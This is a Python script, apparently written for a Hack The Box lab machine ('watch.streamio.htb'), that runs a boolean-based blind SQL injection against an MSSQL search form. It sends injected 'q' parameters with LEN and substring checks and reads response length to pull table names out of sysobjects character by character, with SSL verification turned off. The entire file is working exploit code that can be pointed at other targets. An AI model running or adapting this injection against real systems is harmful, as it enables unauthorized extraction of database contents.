import requests
from requests.structures import CaseInsensitiveDict
import re
import sys
import urllib3
import string

#Disable warnings of insecure SSL requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#Define global variables
target = 'https://watch.streamio.htb/search.php'
headers = CaseInsensitiveDict()
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
data={}
#This is the "payload" that will be inserted inside the substring function
function = "(SELECT TOP 1 NAME FROM sysobjects WHERE xtype='U' AND name>'users')"

#A very good cheatsheet for MSSQL Databases --> https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/

#Set dictionary (abcdefghijklmnopqrstuvwxyz0123456789.-_ $!)
dictionary = string.ascii_lowercase + string.digits + '.-_ $!'

#Calculate the length of the result
def calculate_length():
	for i in range(1,100):
		data['q'] = f"avenger%' AND (LEN({function}) = {i});--"
		r = requests.post(target,data=data,headers=headers,verify=False)
		if int(r.headers['Content-length']) > 1500:
			length = i
			print(f"The length of the {function} function is {length}")
			return length

#Send data via post
def dump_results():
	length = calculate_length()
	result = ''
	for i in range(1,length+1):
		for d in dictionary:
			data['q'] = f"avenger%' AND (substring({function}, 1, {i}) = '{result}{d}');--"
			r = requests.post(target,data=data,headers=headers,verify=False)
			#Content-Length < 1500 means "no data from the database has been returned" (not exact number)
			#Content-Length > 1500 means "data from the avenger movies has been returned, so the boolean query is true"
			if int(r.headers['Content-length']) > 1500:
				print(d)
				result+=d
				break
	print("Result --> "+result)


dump_results();
